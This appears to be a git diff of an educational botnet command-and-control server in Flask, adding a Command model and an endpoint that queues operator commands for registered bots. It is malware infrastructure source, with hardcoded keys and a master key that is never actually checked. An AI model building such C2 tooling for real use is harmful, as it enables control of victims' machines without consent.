@@ -1,5 +1,6 @@
 from flask import Flask, url_for, request, redirect, jsonify, render_template, session 
 from flask_sqlalchemy import SQLAlchemy
+from datetime import datetime  
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///edubotnet.sqlite3'
@@ -8,6 +9,7 @@ db = SQLAlchemy(app)
 FIRSTCONTACTKEY = 'firstcontact'
 # TODO: Change the register key to change dynamically 
 REGISTERKEY = 'registerkey'
+MASTERKEY = 'masterkey'
 
 """
 def returnjson(*arg):
@@ -24,10 +26,13 @@ class Bot(db.Model):
     id = db.Column('bot_id', db.Integer, primary_key=True)
     ip = db.Column(db.String(128))
     os = db.Column(db.String(128))
+    # TODO: This might have to change later 
+    cmds = db.relationship('Command', backref='bot', lazy=True)
 
     def __init__(self, ip, os):
         self.ip = ip 
         self.os = os
+        self.cmds = []
 
     def get_id(self):
         return self.id
@@ -42,9 +47,43 @@ class Bot(db.Model):
         info = 'Bot[' + str(self.id) + '] IP: ' + self.ip + ' OS: ' + self.os
         return info
 
+    def get_commands(self):
+        result = '' 
+        i = 0 
+        for command in self.cmds:
+            tmp = '[' + str(i) +'] ' + command.cmd + '\n'
+            result += tmp 
+            i+=1 
+
+        return result 
+
     def jsonbot(self):
         # TODO: Create a function which returns a jsonify version of the bot information 
         pass 
+
+class Command(db.Model):
+    id = db.Column('cmd_id', db.Integer, primary_key=True)
+    cmd = db.Column(db.String(128))
+    result = db.Column(db.String(500))
+    bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
+    timestamp = db.Column(db.String(50)) 
+
+    def __init__(self, cmd, bot_id):
+        self.cmd = cmd 
+        self.bot_id = bot_id 
+        self.timestamp = str(datetime.now())
+
+    def set_result(self, result):
+        self.result = result 
+
+    def get_info(self):
+        info = '[Command Info] [' + self.timestamp + '] Bot_id: ' + str(self.bot_id) + ' Command Issued: ' + self.cmd
+        result = self.result 
+
+        return '\n'.join([info, result])
+
+    #def pushCommand(self)
+
 
 def init_db():
     db.drop_all()
@@ -118,7 +157,6 @@ def register():
         if bot_os is None:
             return jsonify({'error': 'os is required'})
 
-        print("[DDEBUGGG] hello?!?!")
         print ("[DEBUG] registerkey = ", registerkey)
         print ("[DEBUG] ip = ", bot_ip)
         print ("[DEBUG] os = ", bot_os)
@@ -146,13 +184,59 @@ def register():
     except Exception as e:
         return '' 
 
-@appr.route('/bot/<id>/push', methods=['POST', 'PUT'])
-def bottask(id):
+@app.route('/bot/<bot_id>/push', methods=['POST'])
+def botpush(bot_id):
     """
-    TODO: This + cmd Model 
+    TODO: This + cmd Model + Master key to reach this API endpoint 
     Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!
+
+    [POST]
+        - masterkey = Master's secret key 
+        - cmd = Command to push to the bot 
+
     """
-    pass
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+    masterkey = data['masterkey']
+    cmd = data['cmd']
+
+    print("[DEBUG] masterkey = ", masterkey)
+    print("[DEBUG] cmd = ", cmd)
+    print("[DEBUG] bot_id = ", bot_id)
+
+
+    try:
+        if data is None:
+            return jsonify({'error': 'Could not process body parameters'})
+        if masterkey is None:
+            return jsonify({'error': 'masterkey is required'})
+        if cmd is None:
+            return jsonify({'error': 'cmd is required'})
+
+        cmd = Command(cmd, bot_id)
+
+        # Query and get the bot which has the bot_id, and then append the command to it 
+
+        query_bot = Bot.query.filter_by(id=bot_id).first()
+
+        try:
+            query_bot.cmds.append(cmd)
+            db.session.add(cmd)
+            db.session.commit()
+            
+        except Exception as e:
+            print("[!!] ERROR for command!")
+            print(e)
+
+        return ''
+
+
+    except Exception as e:
+        return '' 
+    #command = Command()
 
 
 # TODO: Change to POST, implement master authentication for OPSEC 
